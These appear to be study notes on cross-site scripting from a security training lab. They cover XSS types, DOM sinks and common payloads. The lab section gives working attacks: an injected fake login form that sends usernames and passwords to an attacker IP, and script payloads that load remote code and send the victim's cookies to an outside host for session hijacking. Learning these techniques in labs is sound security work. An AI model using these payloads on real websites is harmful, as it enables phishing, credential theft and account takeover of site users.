XSS vulnerabilities are solely executed on the client-side and hence do not directly affect the back-end server.
# Types of XSS
- Stored (Persistent) XSS: The most critical type of XSS, which occurs when user input is stored on the back-end database and then displayed upon retrieval (e.g., posts or comments)
- Reflected (Non-Persistent) XSS: Occurs when user input is displayed on the page after being processed by the backend server, but without being stored (e.g., search result or error message)
- DOM-based XSS: Another Non-Persistent XSS type that occurs when user input is directly shown in the browser and is completely processed on the client-side, without reaching the back-end server (e.g., through client-side HTTP parameters or anchor tags)

# DOM-based XSS
## Source & Sink

Some of the commonly used JavaScript functions to write to DOM objects are:
- document.write()
- DOM.innerHTML
- DOM.outerHTML

Furthermore, some of the jQuery library functions that write to DOM objects are:
- add()
- after()
- append()

## Common attacks
- img src="" onerror=alert(window.origin)>
- <script> alert("CHUPAPI")</script> -> payloads with js language
- svg onload=alert(1)> -> payloads with js language
- img src onerror=alert(document.domain)> -> inner html (img or iframe)

# Lab
## Phishing
Identify:
```bash
'><script>alert("THM")</script>'<
```
Payload
```bash
'><img src=x onerror="document.write('<h3>Please login to continue</h3><form action=http://10.10.14.51><input type=\'text\' name=\'username\' placeholder=\'Username\'><input type=\'password\' name=\'password\' placeholder=\'Password\'><input type=\'submit\' name=\'submit\' value=\'Login\'></form>'); document.getElementById('urlform').remove();">
```
## Session Hijacking
Payload
```bash
"><script src=http://10.10.14.51/script.js></script>
```
```javascript
document.location='http://10.10.16.7/index.php?c='+document.cookie;
new Image().src='http://10.10.16.7/index.php?c='+document.cookie;
```

